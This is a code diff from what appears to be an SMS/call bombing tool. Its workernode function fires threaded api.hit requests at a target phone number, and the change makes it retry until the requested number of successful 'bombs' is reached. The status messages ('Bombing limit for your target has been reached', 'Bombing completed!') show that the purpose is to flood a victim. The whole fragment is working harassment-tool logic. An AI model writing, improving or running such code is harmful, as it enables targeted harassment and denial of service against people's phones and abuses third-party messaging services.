@@ -315,27 +315,27 @@ def workernode(mode,cc,target,count,delay,max_threads):
         bann_text()
         sys.exit()
 
-
-    with ThreadPoolExecutor(max_workers=max_threads) as executor:
-        jobs = []
-        for i in range(count):
-            jobs.append(executor.submit(api.hit))
-        success,failed=0,0
-        for job in as_completed(jobs):
-            result = job.result()
-            if result==None:
-                mesgdcrt.FailureMessage("Bombing limit for your target has been reached")
-                mesgdcrt.GeneralMessage("Try Again Later !!")
-                input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
-                bann_text()
-                sys.exit()
-            if result:
-                success+=1
-            else:
-                failed+=1
+    success,failed=0,0
+    while success<count:
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            jobs = []
+            for i in range(count-success):
                 jobs.append(executor.submit(api.hit))
-            clr()
-            pretty_print(cc,target,success,failed)
+
+            for job in as_completed(jobs):
+                result = job.result()
+                if result==None:
+                    mesgdcrt.FailureMessage("Bombing limit for your target has been reached")
+                    mesgdcrt.GeneralMessage("Try Again Later !!")
+                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
+                    bann_text()
+                    sys.exit()
+                if result:
+                    success+=1
+                else:
+                    failed+=1
+                clr()
+                pretty_print(cc,target,success,failed)
     print("\n")
     mesgdcrt.SuccessMessage("Bombing completed!")
     time.sleep(1.5)
